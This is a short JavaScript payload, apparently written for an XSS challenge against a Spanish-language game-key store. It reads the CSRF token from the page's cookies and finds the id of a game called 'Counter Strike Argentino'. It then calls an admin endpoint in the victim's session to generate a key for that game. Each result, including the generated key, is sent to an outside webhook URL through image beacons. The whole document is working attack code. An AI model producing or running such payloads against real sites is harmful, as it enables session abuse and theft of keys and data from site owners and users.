(async()=>{
  const W = "https://webhooktest.net/webhook/01a12c84-d1c2-7258-acfc-88970615c34a";
  const C = (document.cookie.match(/csrftoken=([^;]+)/)||[])[1] || "";
  const EP = "/admin-panel/claves/generar";
  const FH = { "Content-Type":"application/x-www-form-urlencoded", "X-CSRFToken": C };
  const JH = { "Content-Type":"application/json", "X-CSRFToken": C };
  function ex(q){ try{ new Image().src = W + "?" + q; }catch(e){} }
  try{
    // 1) buscar el id REAL de CS Argentino en ESTA instancia
    const list = (await (await fetch("/api/juegos")).json()).juegos;
    const g = list.find(x => /counter\s*strike\s*argentino/i.test(x.nombre));
    if(!g){ ex("err=game_not_found"); return; }
    const ID = g.id;
    ex("found_id=" + encodeURIComponent(ID) + "&nombre=" + encodeURIComponent(g.nombre));
    // 2) generar la clave con ese id (form-encoded primero, json de respaldo)
    let r = await fetch(EP, {method:"POST", headers:FH, body:"juego_id="+ID});
    let t = await r.text();
    ex("form&s=" + r.status + "&d=" + encodeURIComponent(t));
    if(!t.includes('"ok": true') && !t.includes('"ok":true')){
      r = await fetch(EP, {method:"POST", headers:JH, body:JSON.stringify({juego_id:ID})});
      t = await r.text();
      ex("json&s=" + r.status + "&d=" + encodeURIComponent(t));
    }
  }catch(e){ ex("err=" + encodeURIComponent(e.message)); }
})();
